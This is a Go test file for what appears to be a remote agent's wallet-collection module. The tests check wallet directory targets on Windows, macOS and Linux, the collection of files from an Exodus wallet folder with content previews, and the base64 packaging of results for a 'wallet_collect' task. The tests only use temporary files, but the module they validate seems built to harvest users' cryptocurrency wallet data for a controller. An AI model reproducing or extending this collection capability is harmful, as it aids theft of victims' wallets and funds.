//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestWalletTargetsPerPlatform(t *testing.T) {
	win := walletTargets("windows", "C:\\Users\\u", "C:\\Users\\u\\AppData\\Roaming", "C:\\Users\\u\\AppData\\Local")
	if len(win) < 5 {
		t.Fatalf("windows targets = %d", len(win))
	}
	mac := walletTargets("darwin", "/Users/u", "", "")
	if len(mac) < 4 || !strings.Contains(mac[0].dir, "Application Support") {
		t.Fatalf("darwin targets = %v", mac)
	}
	lin := walletTargets("linux", "/home/u", "", "")
	if len(lin) < 4 || !strings.Contains(lin[0].dir, ".config") {
		t.Fatalf("linux targets = %v", lin)
	}
}

func TestCollectWalletFromTargetsBoundedAndSymlinkSafe(t *testing.T) {
	root := t.TempDir()
	walletDir := filepath.Join(root, "Exodus")
	if err := os.MkdirAll(filepath.Join(walletDir, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	// A small text file (gets a preview) and a large file (metadata only).
	if err := os.WriteFile(filepath.Join(walletDir, "wallet.json"), []byte(`{"name":"main"}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(walletDir, "sub", "big.dat"), []byte(strings.Repeat("x", walletMaxFileBytes+10)), 0o644); err != nil {
		t.Fatal(err)
	}
	// A symlink to a file outside the wallet dir — must not be followed/read.
	outside := filepath.Join(root, "secret.txt")
	if err := os.WriteFile(outside, []byte("SHOULD-NOT-APPEAR"), 0o644); err != nil {
		t.Fatal(err)
	}
	_ = os.Symlink(outside, filepath.Join(walletDir, "link.txt"))

	report := collectWalletFromTargets([]walletTarget{{label: "Exodus", dir: walletDir}})
	if !strings.Contains(report, "Exodus") || !strings.Contains(report, "wallet.json") {
		t.Fatalf("report missing wallet files: %s", report)
	}
	if strings.Contains(report, "SHOULD-NOT-APPEAR") {
		t.Fatalf("symlink target was read: %s", report)
	}
	if !strings.Contains(report, "preview:") {
		t.Fatalf("small text file had no preview: %s", report)
	}
}

func TestWalletHandleProducesBase64Envelope(t *testing.T) {
	var res TaskResult
	handleWalletCollect(Task{Type: "wallet_collect"}, &res)
	if res.Encoding != "base64" || res.Output == "" {
		t.Fatalf("bad envelope: encoding=%q len=%d", res.Encoding, len(res.Output))
	}
}
